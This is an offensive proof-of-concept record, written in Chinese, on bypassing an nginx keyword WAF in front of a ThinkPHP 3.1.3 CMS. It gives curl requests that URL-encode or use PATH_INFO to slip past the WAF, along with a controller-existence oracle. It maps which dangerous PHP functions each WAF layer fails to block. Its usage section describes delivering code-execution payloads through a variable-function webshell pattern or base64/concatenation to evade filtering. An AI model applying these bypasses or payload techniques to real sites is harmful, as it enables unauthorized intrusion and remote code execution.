# ThinkPHP 3.1.3 站群 CMS：Admin 控制器「403 假分叉」判别 —— 实为 nginx 层危险函数关键词 WAF，URL 编码即还原统一 302 闸门

- **code**: thinkphp-3.1.3-站群-cms-admin-控制器-403-假分叉-判别-实为-nginx-层危险函数
- **kind**: poc
- **category**: auth-bypass
- **component**: SomCNS / ThinkPHP 3.1.3 站群 CMS
- **versions**: ThinkPHP 3.1.3
- **severity**: low
- **source**: self
- **verified**: 1
- **verified_note**: 实测于 192.0.2.1（源站）与 192.0.2.3/.84/.88（CDN）：GET /index.php?g=Admin&m=System&a=index → 403/548B/无 Set-Cookie；GET /index.php?g=Admin&m=Sy%73tem&a=index → 302→/ + PHPSESSID；GET /index.php?g=Admin&m=Main&a=index&system=1 → 403/548B；GET /index.php/Admin/System/index → 302；POST body q=eval(system('id')) → 403/47B "Access Denied: Dangerous function call detected"；GET /index.php?g=Admin&m=%73ystem（小写 s）→ 404。30 个 action 全矩阵 + 无 cookie/伪造 admin_user+admin_id/再加 admin_pass 三身份对照全部 302，无例外。
- **path**: pocs/thinkphp-3.1.3-站群-cms-admin-控制器-403-假分叉-判别-实为-nginx-层危险函数/poc.txt
- **tags**: thinkphp3.1.3,站群,waf,403假分叉,url编码绕过,控制器预言机,负面情报
- **created_at**: 2026-10-28T18:18:25.252Z
- **engine**: 192.0.2.1 / https://target479.example.com

## 描述

遇到「同一组控制器里唯独某个 m= 返回 403、其余 302」时，先做关键词假阳性排除：把该控制器名作为无意义参数拼到别的控制器请求上，若同样 403 就不是应用层分叉而是前置 WAF 关键字符匹配；再用 URL 编码或 PATH_INFO 重放，变回 302 即证实。顺带得到控制器存在性预言机与目标 WAF 两层规则画像。

## 用法

```
1) 403 归属判定（三连）：
 curl -k --noproxy '*' "https://TARGET/index.php?g=Admin&m=Other&a=index&probe=system"   # 403 且无 PHPSESSID ⇒ 前置 WAF
 curl -k --noproxy '*' "https://TARGET/index.php?g=Admin&m=Sy%73tem&a=index"             # 302→/ + PHPSESSID ⇒ 绕过 WAF，闸门照旧
 curl -k --noproxy '*' "https://TARGET/index.php/Admin/System/index"                    # 302 ⇒ 路径不被检查
2) 控制器存在性：curl -k "https://TARGET/index.php?g=Admin&m=W%65chat&a=index"（404=不存在 / 302=存在）
3) 绕 WAF 投递：query 用 %XX 编码危险函数名；body 用变量函数 $a=$_POST['f'];$a($_POST['c']); 或 base64/字符串拼接，避开 eval( / system( / assert( / passthru( / shell_exec( / phpinfo() 字面。
```

## 正文

```
## 结论
「m=System 返回 403、其它控制器 302」不是应用层分叉，是 nginx 层危险函数关键词 WAF。System 这个名字本身命中规则。

## 证据
| 请求 | 结果 |
|---|---|
| `?g=Admin&m=System&a=index` | 403 / 548B / 无 Set-Cookie |
| `?g=Admin&m=Main&a=index&system=1` | 403 / 548B（关键词拼到别的控制器照样拦） |
| `?g=Admin&m=Sy%73tem&a=index` | 302 → `/` + PHPSESSID（绕过 WAF 后与其它控制器一致） |
| `?g=Admin&m=%53ystem&a=index` | 302 |
| `?g=Admin&m=%73ystem&a=index`（小写 s） | 404（TP 文件名大小写敏感 ⇒ SystemAction 真实存在） |
| `/index.php/Admin/System/index` | 302（PATH_INFO 不被检查） |
| POST body `q=eval(system('id'))` | 403 / 47B `Access Denied: Dangerous function call detected` |

## WAF 画像（两层）
- query 层：不区分大小写连续子串匹配，**不解 URL 编码**，命中返回 548B nginx 页（拦 system/eval/assert/exec/popen/call_user_func 等裸词）
- body 层：拦 `eval(` / `system(` / `assert(` / `passthru(` / `shell_exec(` / `phpinfo()`，返回 47B；不拦 `popen(` / `call_user_func(` / `base64_decode(` / `include(` 与变量函数

## 附带产出
- 控制器存在性预言机：`m=<URL编码名>&a=index` → 302=存在（被闸门拦）/ 404=文件不存在
- 全矩阵 30 个 action + 三身份（无 cookie / 伪造 admin_user+admin_id / 再加 admin_pass）全部 302 ⇒ 闸门 CommonAction::_initialize 统一且先于业务执行
```
